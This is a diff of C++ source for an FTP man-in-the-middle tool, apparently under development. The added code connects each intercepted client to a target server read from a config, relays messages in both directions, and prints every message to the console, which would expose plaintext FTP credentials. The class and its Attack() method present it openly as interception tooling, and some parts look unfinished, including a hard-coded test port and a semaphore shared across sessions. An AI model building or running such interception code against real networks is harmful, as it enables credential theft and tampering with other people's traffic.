@@ -2,9 +2,6 @@
 #include <yaml-cpp/yaml.h>
 #include <filesystem>
 #include <iostream>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <unistd.h>
 #include <arpa/inet.h>
 
 void FtpMitm::LoadConfig(const std::string& config_path) {
@@ -67,21 +64,54 @@ void FtpMitm::Attack() {
     }
 }
 
-std::string FtpMitm::recvCommand(int clientSocket) {
+std::string FtpMitm::reciveMsg(int socket) {
     char* buffer = new char[this->_buffer_size]{};
-    recv(clientSocket, buffer, this->_buffer_size, 0);
+    recv(socket, buffer, this->_buffer_size, 0);
     std::string result(buffer);
     delete[] buffer;
     return result;
 }
 
-void FtpMitm::translateSession(int clientSocket, Task task) {
-    bool hold = true;
-    while (hold) {
-        std::string command = this->recvCommand(clientSocket);
-        std::cout << command << std::endl;
-        hold = false;
+void FtpMitm::sendMsg(int socket, const std::string& msg) {
+    send(socket, msg.c_str(), msg.size(), 0);
+}
+
+bool FtpMitm::translateMessages(int clientSocket, int serverSocket, Task task) {
+    static int semaphore = 1; // server speaking first
+    if (semaphore) {
+        std::string msg = this->reciveMsg(serverSocket);
+        std::cout << "[*] Server: " << msg << std::endl;
+        this->sendMsg(clientSocket, msg);
+        semaphore = 0;
+    } else {
+        std::string msg = this->reciveMsg(clientSocket);
+        std::cout << "[*] Client: " << msg << std::endl;
+        this->sendMsg(serverSocket, msg);
+        semaphore = 1;
     }
+    return true;
+}
+
+void FtpMitm::translateSession(int clientSocket, Task task) {
+    int serverSocket = socket(AF_INET, SOCK_STREAM, 0);
+    if (serverSocket < 0) {
+        std::cout << "Can not open socket for server!" << std::endl;
+        return;
+    }
+    sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(2122); // test port (change later)
+    if (inet_pton(AF_INET, task.GetServer().c_str(), &serverAddr.sin_addr) <= 0) {
+        std::cout << "Could not find server: " << task.GetServer() << std::endl;
+        return;
+    }
+    if (connect(serverSocket, (sockaddr*)&serverAddr, sizeof serverAddr)) {
+        std::cout << "Could not connect to server!" << std::endl;
+        return;
+    }
+    std::cout << "Connected to server, message translation started..." << std::endl;
+    
+    while (this->translateMessages(clientSocket, serverSocket, task));
 }
 
 void FtpMitm::holdClient(int clientSocket, sockaddr_in clientAddr) {
@@ -95,6 +125,7 @@ void FtpMitm::holdClient(int clientSocket, sockaddr_in clientAddr) {
             task = this->_tasks[i];
             break;
         }
+    std::cout << "MITM target for current client: " << task.GetServer() << std::endl;
     this->translateSession(clientSocket, task);
 }
 
